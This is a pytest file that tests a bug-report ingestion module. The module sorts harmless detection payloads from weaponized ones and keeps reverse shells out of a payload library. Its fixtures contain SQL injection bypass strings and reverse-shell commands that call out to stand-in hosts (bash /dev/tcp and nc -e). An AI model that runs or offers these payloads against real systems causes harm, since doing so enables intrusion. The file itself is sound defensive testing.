"""Tests for core.knowledge.report_ingest.

Covers vuln-class inference, payload extraction, the safety-gate split
(accepted vs rejected weaponization), FP-note harvesting, and library promotion
including the propose-only dry run and the hard guarantee that a reverse shell
is never promoted.
"""

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from core.selfimprove import report_ingest
from core.selfimprove.report_ingest import ingest_report, promote_to_library


# ── Fixtures (inline disclosed-report samples) ────────────────────────────────

SQLI_REPORT = """\
# SQL Injection in /login email parameter

## Summary
The `email` parameter on the login endpoint is vulnerable to SQL injection.
A classic boolean payload bypasses authentication.

## Steps to reproduce
Send the following payload in the email field:

```sql
' OR 1=1--
```

You can also confirm blind injection with a time delay:

```
admin' AND SLEEP(5)--
```

The inline marker `' OR '1'='1` also works.

## Triage note
The reporter's second endpoint /search was marked **not exploitable** and is a
duplicate of an earlier report. The /promo path is out of scope.
"""

REVERSE_SHELL_REPORT = """\
# RCE via command injection in ping host param

## Summary
The host parameter allows OS command injection (remote code execution).

## Proof
Confirm with a benign read-only command:

```
127.0.0.1; id
```

The reporter then escalated to a full reverse shell:

```
127.0.0.1; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

Another weaponized stage:

```
nc -e /bin/sh 10.0.0.1 4444
```
"""


# ── Vuln-class inference + extraction ────────────────────────────────────

def test_infers_sql_injection_class():
    result = ingest_report(SQLI_REPORT, source="h1:12345")
    assert result["vuln_class"] == "sql_injection"
    assert result["source"] == "h1:12345"


def test_accepts_classic_boolean_payload():
    result = ingest_report(SQLI_REPORT)
    assert "' OR 1=1--" in result["accepted"]
    # accepted mirrors payloads exactly.
    assert result["accepted"] == result["payloads"]


def test_accepts_time_based_sleep_marker():
    # SLEEP-based time payloads are detection signals and must be allowed.
    result = ingest_report(SQLI_REPORT)
    assert any("SLEEP(5)" in p for p in result["accepted"])


def test_extracts_inline_code_payload():
    result = ingest_report(SQLI_REPORT)
    assert "' OR '1'='1" in result["accepted"]


def test_signals_present_for_class():
    result = ingest_report(SQLI_REPORT)
    assert result["signals"], "expected per-class detection signals"
    assert any("differential" in s.lower() or "sleep" in s.lower() for s in result["signals"])


def test_fp_notes_harvested():
    result = ingest_report(SQLI_REPORT)
    blob = " ".join(result["fp_notes"]).lower()
    assert "not exploitable" in blob
    assert "duplicate" in blob
    assert "out of scope" in blob


def test_no_payloads_rejected_in_clean_report():
    result = ingest_report(SQLI_REPORT)
    assert result["rejected"] == []


# ── Reverse-shell report: rejection + never-promoted guarantee ──────────────

def test_reverse_shell_is_rejected():
    result = ingest_report(REVERSE_SHELL_REPORT)
    rejected_payloads = [p for (p, _reason) in result["rejected"]]
    assert any("/dev/tcp/" in p for p in rejected_payloads), "reverse shell must be rejected"
    assert any("nc -e" in p for p in rejected_payloads), "netcat exec shell must be rejected"


def test_reverse_shell_not_in_accepted():
    result = ingest_report(REVERSE_SHELL_REPORT)
    for p in result["accepted"]:
        assert "/dev/tcp/" not in p
        assert "nc -e" not in p
        assert "bash -i" not in p


def test_benign_command_marker_allowed():
    # The read-only `; id` confirmation marker is detection-grade and allowed.
    result = ingest_report(REVERSE_SHELL_REPORT)
    assert result["vuln_class"] == "rce"
    assert any(p.strip().endswith("; id") or "; id" in p for p in result["accepted"])


def test_rejected_carries_reason():
    result = ingest_report(REVERSE_SHELL_REPORT)
    assert result["rejected"], "expected rejected weaponization"
    for payload, reason in result["rejected"]:
        assert isinstance(reason, str) and reason


# ── Promotion to library ────────────────────────────────────────────────

def test_promote_writes_accepted_under_class(tmp_path):
    lib = tmp_path / "payloads.json"
    result = ingest_report(SQLI_REPORT)
    out = promote_to_library(result, library_path=str(lib))

    assert out["written"] is True
    assert out["vuln_class"] == "sql_injection"
    data = json.loads(lib.read_text(encoding="utf-8"))
    assert "' OR 1=1--" in data["sql_injection"]


def test_promote_dedupes_on_second_run(tmp_path):
    lib = tmp_path / "payloads.json"
    result = ingest_report(SQLI_REPORT)
    promote_to_library(result, library_path=str(lib))
    first = json.loads(lib.read_text(encoding="utf-8"))["sql_injection"]

    second_out = promote_to_library(result, library_path=str(lib))
    second = json.loads(lib.read_text(encoding="utf-8"))["sql_injection"]

    assert second_out["added"] == [], "re-promotion must add nothing"
    assert first == second, "library must be unchanged on duplicate promote"
    # No payload appears twice.
    assert len(second) == len(set(second))


def test_promote_merges_with_existing_class(tmp_path):
    lib = tmp_path / "payloads.json"
    lib.write_text(json.dumps({"sql_injection": ["preexisting--"]}), encoding="utf-8")

    result = ingest_report(SQLI_REPORT)
    promote_to_library(result, library_path=str(lib))
    data = json.loads(lib.read_text(encoding="utf-8"))

    assert "preexisting--" in data["sql_injection"]
    assert "' OR 1=1--" in data["sql_injection"]


def test_propose_only_writes_nothing(tmp_path):
    lib = tmp_path / "payloads.json"
    result = ingest_report(SQLI_REPORT)
    out = promote_to_library(result, library_path=str(lib), propose_only=True)

    assert out["written"] is False
    assert out["added"], "propose_only should still report what would be added"
    assert not lib.exists(), "propose_only must not create the library file"


def test_reverse_shell_never_promoted(tmp_path):
    lib = tmp_path / "payloads.json"
    result = ingest_report(REVERSE_SHELL_REPORT)
    promote_to_library(result, library_path=str(lib))

    if lib.exists():
        data = json.loads(lib.read_text(encoding="utf-8"))
        blob = json.dumps(data)
        assert "/dev/tcp/" not in blob
        assert "nc -e" not in blob
        assert "bash -i" not in blob


def test_promote_handles_empty_result(tmp_path):
    lib = tmp_path / "payloads.json"
    out = promote_to_library(ingest_report(""), library_path=str(lib))
    assert out["written"] is False
    assert out["added"] == []
    assert not lib.exists()


def test_promote_re_vets_smuggled_payload(tmp_path):
    # Even if a caller hand-crafts a result with a weaponized payload, the
    # promotion boundary re-runs the safety gate and drops it.
    lib = tmp_path / "payloads.json"
    smuggled = {
        "vuln_class": "rce",
        "accepted": ["id", "bash -i >& /dev/tcp/1.2.3.4/9001 0>&1"],
        "payloads": ["id", "bash -i >& /dev/tcp/1.2.3.4/9001 0>&1"],
    }
    promote_to_library(smuggled, library_path=str(lib))
    data = json.loads(lib.read_text(encoding="utf-8"))
    assert "id" in data["rce"]
    assert all("/dev/tcp/" not in p for p in data["rce"])


def test_module_exports():
    assert hasattr(report_ingest, "ingest_report")
    assert hasattr(report_ingest, "promote_to_library")


if __name__ == "__main__":
    import pytest

    raise SystemExit(pytest.main([__file__, "-q"]))
